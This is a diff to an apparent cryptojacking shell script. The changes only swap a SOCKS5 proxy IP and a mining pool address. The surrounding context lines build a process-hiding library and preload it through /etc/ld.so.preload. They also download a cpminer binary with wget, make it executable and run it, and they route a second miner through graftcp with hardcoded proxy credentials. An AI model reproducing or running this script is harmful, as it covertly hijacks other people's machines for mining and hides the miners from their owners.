@@ -25,7 +25,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 209.97.145.189:443
+socks5 = 104.131.70.157:443
 socks5_username = majapahlevi
 socks5_password = majapahlevi
 END
@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 167.71.107.204:80 -u pyrin:qp7gwewn47lw3wq2ektxjkn0zjljgy0tu0srlqt53j8y9v28p89hcrjyzlds7.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar  -o stratum+tcp://138.197.12.20:443 -u shuga1qk2xeu9l86rw6hwjfezfs3dpy3zcfms0svh9j96 -t4
+./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 167.71.107.204:80 -u pyrin:qp7gwewn47lw3wq2ektxjkn0zjljgy0tu0srlqt53j8y9v28p89hcrjyzlds7.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar  -o stratum+tcp://138.197.2.25:80 -u shuga1qk2xeu9l86rw6hwjfezfs3dpy3zcfms0svh9j96 -t4
